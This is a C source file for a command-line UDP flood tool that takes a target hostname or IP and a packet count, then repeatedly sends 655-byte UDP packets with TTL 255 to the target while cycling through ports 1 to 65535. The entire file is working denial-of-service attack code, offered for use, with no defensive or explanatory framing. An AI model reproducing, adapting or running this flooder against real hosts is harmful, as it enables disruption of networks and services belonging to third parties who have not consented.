#include "flood.h"
#include <pthread.h>
#include <stdio.h>

#define PACKT_SIZE 655


void *udp_flood_thread(void *vargb);
int counter = 0, packet_num = 0, ec = 0, p = 1;

/**
 * This function is use for
 * sending the UDP packets to the target..
*/
void udp_flood(char *dest_ip, char *port) {

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_DGRAM;
    struct addrinfo *peer_address;
    if(getaddrinfo(dest_ip, port, &hints, &peer_address)) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to configure remote address %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }

    //Create a socket and check for errors
    int sock = socket(peer_address->ai_family, peer_address->ai_socktype,
                            peer_address->ai_protocol);
    if(sock < 0) {
        fprintf(stderr, "%s[%sERROR%s]:%s Error creating socket %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }

    //On most systems kernel by default the TTL value is 64.. we change it to 255
    int ttl = 255;
    if(setsockopt(sock, SOL_IP, IP_TTL, &ttl, sizeof(ttl)) < 0) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to set TTL value %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }

    char packt[PACKT_SIZE];
    memset(packt, 0, sizeof(packt));
    int i = 0;
    for(; i < PACKT_SIZE-1; i++)
        packt[i] = i + '0';

    packt[i] = 0;
    
    if(sendto(sock, packt, sizeof(packt), 0, peer_address->ai_addr,
             peer_address->ai_addrlen) < 0) {
        ec++;
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to send packet %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        if(ec == 5)
            exit(1);
    }
    counter++;
    freeaddrinfo(peer_address);
    close(sock);
}
void print_status(char *ip) {
    printf("%s[%sINFO%s]:%s Sending UDP packet through port %s...(%d/%d)\n", 
    whi, gre, whi, res, ip, counter, packet_num);
}
void *udp_flood_thread(void *vargb) {
    char *host = (char *)vargb;
    char port[20];
    if(p == 65535)
        p = 1;
    sprintf(port, "%d", p);
    udp_flood(host, port);
    print_status(port);
    p++;
    return NULL;
}
int main(int argc, char *argv[]) {

    if(argc < 3) {
        printf("%s[%sCRITICAL%s]:%s Missing argument(s)...\n", whi, yel, whi, res);
        fprintf(stderr, "%sUsage:%s udp_flood [hostname/IP] [number of packets to send]\n", whi, res);
        exit(1);
    }

    char *host = argv[1];
    packet_num = atoi(argv[2]);
    
    pthread_t thread_id;
    int i = 0;
    while(i < packet_num){
        pthread_create(&thread_id, NULL, udp_flood_thread, (void*)host);
        pthread_join(thread_id, NULL);
        i++;
    }
    
    return 0;
}
